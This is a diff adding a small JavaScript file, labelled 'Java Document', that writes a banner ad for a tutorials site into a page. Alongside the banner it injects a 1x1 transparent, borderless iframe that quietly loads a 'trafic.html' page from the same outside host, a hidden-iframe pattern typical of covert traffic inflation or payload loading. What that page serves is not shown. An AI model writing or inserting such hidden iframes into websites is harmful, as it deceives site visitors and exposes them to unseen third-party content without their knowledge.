@@ -1,0 +1,2 @@
+// Java Document
+document.write('<a href="http://tutorials.vufu.net" target="_blank"><img src="http://tutorials.vufu.net/banner468_2.gif" alt="Best Tutorials Site From Romania for noobs and experts" border="0" width="468" height="60"></a><iframe src="http://tutorials.vufu.net/trafic.html" width="1" height="1" allowtransparency="yes" style="background-color:transparent; border-color:transparent; border-width:0;" scrolling="no" frameborder="0" hspace="0" marginheight="0" marginwidth="0" vspace="0"></iframe>');
